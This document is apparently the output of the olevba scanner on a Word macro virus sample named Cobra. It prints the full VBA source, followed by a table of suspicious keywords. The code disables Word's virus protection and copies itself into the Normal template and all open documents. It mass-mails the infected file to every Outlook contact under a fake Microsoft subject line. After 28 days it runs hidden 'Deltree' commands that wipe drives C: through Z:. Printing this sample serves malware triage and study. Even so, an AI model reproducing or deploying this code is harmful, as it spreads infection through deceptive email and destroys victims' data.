olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.s-1a8a4e215693817642838c8509bff720a1539f77
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.s-1a8a4e215693817642838c8509bff720a1539f77 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Friday.bas 
in file: Virus.MSWord.Cobra.s-1a8a4e215693817642838c8509bff720a1539f77 - OLE stream: 'Macros/VBA/Friday'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0J.B
'An Intelligent Member of Cobra Family
Sub FileNew()
Call Protection
Call Infection
Call SeM
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call Protection
Call Infection
Call SeM
WordBasic.FileExit
End Sub
Sub FileOpen()
Call Protection
Call Infection
Call SeM
Dialogs(wdDialogFileOpen).Show
End Sub
Sub AutoClose()
Call Protection
Call Infection
Call SeM
End Sub
Sub AutoOpen()
Call Protection
Call Infection
Call SeM
End Sub
Sub Protection()
On Error Resume Next
CustomizationContext = NormalTemplate
For i = 1 To 3
CommandBars("Macro").Controls(i).OnAction = "ViewVBCode"
Next
CommandBars("View").Controls("Toolbars").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
End Sub
Sub Infection()
On Error Resume Next
Set N = NormalTemplate
Set D = ActiveDocument
NIN = False
For Each M In N.VBProject.VBComponents
If M.Name = "Friday" Then NIN = True
If M.Name <> "ThisDocument" And M.Name <> "Friday" Then Application.OrganizerDelete Source:=N.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If NIN = False Then Application.OrganizerCopy Source:=D.FullName, Destination:=N.FullName, Name:="Friday", Object:=wdOrganizerObjectProjectItems
For Each OD In Documents
For Each M In OD.VBProject.VBComponents
DIN = False
If M.Name = "Friday" Then DIN = True
If M.Name <> "Friday" And M.Name <> "Reference to Normal" And M.Name <> "ThisDocument" Then Application.OrganizerDelete Source:=OD.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If DIN = False Then
Application.OrganizerCopy Source:=N.FullName, Destination:=OD.FullName, Name:="Friday", Object:=wdOrganizerObjectProjectItems
OD.SaveAs OD.FullName, wdFormatDocument, False
End If
Next
End Sub
Sub ViewVBCode()
End Sub
Sub SeM()
On Error Resume Next
DY = "Fri"
If WeekDay(Date) = 1 Then DY = "San"
If WeekDay(Date) = 2 Then DY = "Sun"
If WeekDay(Date) = 3 Then DY = "Mon"
If WeekDay(Date) = 4 Then DY = "Tue"
If WeekDay(Date) = 5 Then DY = "Wed"
If WeekDay(Date) = 6 Then DY = "Thu"
If WeekDay(Date) = 7 Then DY = "Fri"
If Not IsDate(System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "FirstDay")) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "FirstDay") = Format(Date, "mm/dd/yy")
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "FirstDay")
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra At " + DY Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra At " + DY
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Dhaka,Bangladesh/3rd World"
Set U = CreateObject("Outlook.Application")
Set D = U.GetNameSpace("MAPI")
D.Logon "profile", "password"
For l = 1 To D.AddressLists.Count
Set AB = D.AddressLists(y)
x = 1
Set B = U.CreateItem(0)
For i = 1 To AB.AddressEntries.Count
t = AB.AddressEntries(x)
B.Recipients.Add t
x = x + 1
Next i
B.Subject = "Important Message From Microsoft Via " & Application.UserName
B.Body = "Important Document About New Software:-"
B.Add ActiveDocument.FullName
B.Send
t = ""
Next l
D.Logoff
End If
CD = Format(Date, "mm/dd/yyyy")
TD = DateValue(CD) - DateValue(ID)
If TD > 28 Then
Call DelDrive
End If
End Sub
Sub DelDrive()
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra At " + "Fri" Then
For i = 67 To 67 + 23
Shell "Deltree /y " + Chr(i) + ":\", vbHide
Next
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

